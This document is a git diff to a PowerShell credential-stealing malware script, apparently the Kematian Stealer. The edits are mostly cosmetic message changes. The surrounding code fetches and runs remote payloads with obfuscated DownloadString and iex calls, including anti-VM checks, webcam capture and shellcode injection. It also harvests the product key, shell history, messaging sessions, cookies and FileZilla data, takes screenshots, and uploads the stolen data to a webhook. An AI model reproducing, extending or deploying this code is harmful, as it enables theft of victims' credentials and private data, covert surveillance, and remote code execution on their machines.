@@ -101,7 +101,7 @@ function Invoke-TASKS {
 function VMPROTECT {
     $link = ("https://github.com/ChildrenOfYahweh/Kematian-Stealer/raw/main/frontend-src/antivm.ps1")
     iex (iwr -uri $link -useb)
-    Write-Host "[!] NOT A VIRTUALIZED ENVIRONMENT !" -ForegroundColor Green
+    Write-Host "[!] NOT A VIRTUALIZED ENVIRONMENT" -ForegroundColor Green
 }
 
 
@@ -122,7 +122,8 @@ function Request-Admin {
 }
 
 function Backup-Data {
-
+    
+	Write-Host "[!] Exfiltration in Progress..." -ForegroundColor Green
     $username = $env:USERNAME
     $hostname = $env:COMPUTERNAME
     $uuid = (Get-WmiObject -Class Win32_ComputerSystemProduct).UUID
@@ -301,7 +302,7 @@ function Backup-Data {
     }
     Get-ProductKey > $folder_general\productkey.txt
 
-    try {Get-Content (Get-PSReadlineOption).HistorySavePath | Out-File -FilePath "$folder_general\clipboard_history.txt" -Encoding UTF8 -ErrorAction SilentlyContinue}catch{}
+    Get-Content (Get-PSReadlineOption).HistorySavePath -ErrorAction SilentlyContinue | Out-File -FilePath "$folder_general\clipboard_history.txt" -Encoding UTF8 
 
     # All Messaging Sessions
     
@@ -710,7 +711,7 @@ Pass: $decodedPass
 
     # Fix webcam hang with unsupported devices
     
-    Write-Host "[!] Capturing an image with Webcam !" -ForegroundColor Green
+    Write-Host "[!] Capturing an image with Webcam" -ForegroundColor Green
     $webcam = ("https://github.com/ChildrenOfYahweh/Kematian-Stealer/raw/main/frontend-src/webcam.ps1")
     $download = "(New-Object Net.Webclient).""`DowNloAdS`TR`i`N`g""('$webcam')"
     $invokewebcam = Start-Process "powershell" -Argument "I'E'X($download)" -NoNewWindow -PassThru
@@ -800,20 +801,15 @@ Pass: $decodedPass
             }
         }
     }
-
-    #try {
-    #    Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'Discord' -Force -ErrorAction 'SilentlyContinue'  | Out-Null
-    #}
-    #catch {}
     
     #Shellcode loader, Thanks to https://github.com/TheWover for making this possible !
     
-    Write-Host "[!] Injecting Shellcode !" -ForegroundColor Green
+    Write-Host "[!] Injecting Shellcode" -ForegroundColor Green
     $kematian_shellcode = ("https://github.com/ChildrenOfYahweh/Kematian-Stealer/raw/main/frontend-src/kematian_shellcode.ps1")
     $download = "(New-Object Net.Webclient).""`DowNloAdS`TR`i`N`g""('$kematian_shellcode')"
     $proc = Start-Process "powershell" -Argument "I'E'X($download)" -NoNewWindow -PassThru
     $proc.WaitForExit()
-    Write-Host "[!] Shellcode Injection Completed !" -ForegroundColor Green
+    Write-Host "[!] Shellcode Injection Completed" -ForegroundColor Green
 
 
     $main_temp = "$env:localappdata\temp"
@@ -831,7 +827,7 @@ Pass: $decodedPass
     $image.Dispose()
 
 
-    Write-Host "[!] Screenshot Captured !" -ForegroundColor Green
+    Write-Host "[!] Screenshot Captured" -ForegroundColor Green
 
     Move-Item "$main_temp\discord.json" $folder_general -Force    
     Move-Item "$main_temp\screenshot.png" $folder_general -Force
@@ -849,7 +845,7 @@ Pass: $decodedPass
         $dirs | ForEach-Object { Remove-Item $_ -Force }
     } while ($dirs.Count -gt 0)
     
-    Write-Host "[!] Getting information about the extracted data !" -ForegroundColor Green
+    Write-Host "[!] Getting information about the extracted data" -ForegroundColor Green
     
     function ProcessCookieFiles {
         $domaindetects = New-Item -ItemType Directory -Path "$folder_general\DomainDetects" -Force
@@ -1014,7 +1010,7 @@ FileZilla: $filezilla_info
         }
     }
 
-    Write-Host "[!] Uploading the extracted data !" -ForegroundColor Green
+    Write-Host "[!] Uploading the extracted data" -ForegroundColor Green
     $embed_and_body = @{
         "username"    = "Kematian"
         "content"     = "@everyone"
@@ -1142,7 +1138,7 @@ if (CHECK_AND_PATCH -eq $true) {
     }
 }
 else {
-    Write-Host "[!] Please run as admin!" -ForegroundColor Red
+    Write-Host "[!] Please run as admin !" -ForegroundColor Red
     Start-Sleep -s 1
     Request-Admin
 }
